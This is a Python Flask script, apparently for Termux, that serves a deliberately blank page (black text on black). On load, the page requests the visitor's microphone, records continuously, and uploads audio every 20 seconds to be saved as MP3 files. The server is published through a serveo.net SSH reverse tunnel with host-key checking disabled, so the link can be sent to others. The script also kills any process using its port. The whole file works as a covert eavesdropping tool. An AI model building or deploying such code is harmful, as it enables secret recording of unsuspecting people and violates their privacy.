import os
import subprocess
import logging
from flask import Flask, request, jsonify
from datetime import datetime
import base64
import time
import threading

# Flask setup
app = Flask(__name__)

# Directory to save recordings (Downloads/Recordings)
RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Recordings')

# Ensure the Recordings folder exists
if not os.path.exists(RECORDINGS_FOLDER):
    os.makedirs(RECORDINGS_FOLDER)

serveo_link = ""

# Set up logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
stream_handler = logging.StreamHandler()
stream_handler.setLevel(logging.INFO)
file_handler = logging.FileHandler('application.log')
file_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
stream_handler.setFormatter(formatter)
file_handler.setFormatter(formatter)
logger.addHandler(stream_handler)
logger.addHandler(file_handler)

@app.route('/')
def index():
    return '''
    <!doctype html>
    <html>
    <head>
        <title>Audio Recorder</title>
    </head>
    <body style="background-color: black; color: black;">
        <script>
            async function initRecorder() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const mediaRecorder = new MediaRecorder(stream);
                    let audioChunks = [];

                    mediaRecorder.ondataavailable = (event) => {
                        audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.readAsDataURL(audioBlob);
                        reader.onloadend = async function() {
                            const base64Data = reader.result.split(',')[1];
                            await fetch('/upload_audio', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ audio: base64Data })
                            });
                        };
                        audioChunks = [];
                    };

                    // Start recording and stop every 20 seconds to auto-save the recording
                    setInterval(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();  // Stop the current recording
                        }
                        mediaRecorder.start();  // Start a new recording
                    }, 20000);  // 20 seconds autosave interval
                } catch (err) {
                    console.error("Microphone access denied:", err);
                }
            }

            window.onload = initRecorder;
        </script>
    </body>
    </html>
    '''

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        # Get audio data from the request
        audio_data = request.json.get('audio')
        if not audio_data:
            raise ValueError("No audio data received")

        # Generate the filename using the new format: Thursday_14_10AM_35M_2024.mp3
        date_str = datetime.now().strftime('%A_%d_%I%p_%HM_%Y')  # Custom format for day_dd_hhAM_mmM_yyyy
        mp3_file = os.path.join(RECORDINGS_FOLDER, f'{date_str}.mp3')

        # Decode the audio data from base64
        audio_bytes = base64.b64decode(audio_data)
        webm_file = os.path.join(RECORDINGS_FOLDER, f'{date_str}.webm')

        # Save the audio as webm temporarily
        with open(webm_file, 'wb') as f:
            f.write(audio_bytes)

        # Convert webm to high-quality mp3
        convert_to_mp3(webm_file, mp3_file)

        # Remove the temporary webm file after conversion
        os.remove(webm_file)

        logger.info(f"Audio saved as MP3: {mp3_file}")
        return jsonify({"message": "Audio saved successfully"}), 200

    except ValueError as ve:
        logger.error(f"Error: {ve}")
        return jsonify({"error": str(ve)}), 400
    except subprocess.CalledProcessError as e:
        logger.error(f"FFmpeg conversion failed: {e}")
        return jsonify({"error": "Audio conversion failed"}), 500
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        return jsonify({"error": "An unexpected error occurred"}), 500

def convert_to_mp3(input_file, output_file):
    try:
        # Run ffmpeg to convert webm to mp3 with high quality (192 kbps)
        subprocess.run(['ffmpeg', '-y', '-i', input_file, '-vn', '-ar', '44100', '-ac', '2', '-b:a', '192k', output_file], check=True)
    except subprocess.CalledProcessError as e:
        logger.error(f"FFmpeg conversion failed: {e}")
        raise

def run_flask(port=4242):
    try:
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)  # Disable auto-reloader
    except Exception as e:
        logger.error(f"Flask server error: {e}")
        raise

def start_serveo_tunnel(port):
    global serveo_link
    serveo_command = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"

    while True:
        try:
            # Start the Serveo tunnel and wait for the URL
            process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            while True:
                output = process.stdout.readline()
                if output == b"" and process.poll() is not None:
                    break
                if output:
                    line = output.decode('utf-8').strip()
                    if "https://" in line:
                        serveo_link = line
                        logger.info(f"Serveo tunnel started. Access the application via: {line}")
                        return
            time.sleep(5)  # Retry if the tunnel fails to start
        except Exception as e:
            logger.error(f"Error starting Serveo tunnel: {e}")
            time.sleep(5)  # Retry after a short delay

def stop_other_processes(port=4242):
    try:
        # Automatically stop processes using the specified port (4242)
        result = subprocess.run(f'lsof -i :{port}', shell=True, capture_output=True, text=True)
        if result.stdout:
            # Extract PIDs of processes using the port
            pids = [line.split()[1] for line in result.stdout.splitlines()[1:]]  # Skip the header line
            for pid in pids:
                subprocess.run(f'kill -9 {pid}', shell=True)
                logger.info(f"Stopped process with PID {pid} using port {port}")
        else:
            logger.info(f"No processes are using port {port}")
    except Exception as e:
        logger.error(f"Error while stopping processes on port {port}: {e}")

def main():
    # Stop processes using the port before starting Flask
    stop_other_processes()

    # Dynamically select a free port (starting from 4242)
    port = 4242
    while True:
        try:
            # Run Flask in a separate thread to avoid blocking Serveo
            flask_thread = threading.Thread(target=run_flask, args=(port,))
            flask_thread.start()
            break
        except Exception:
            logger.error(f"Port {port} is in use. Trying another port.")
            port += 1

    # Start the Serveo tunnel in the main thread
    start_serveo_tunnel(port)

if __name__ == '__main__':
    main()
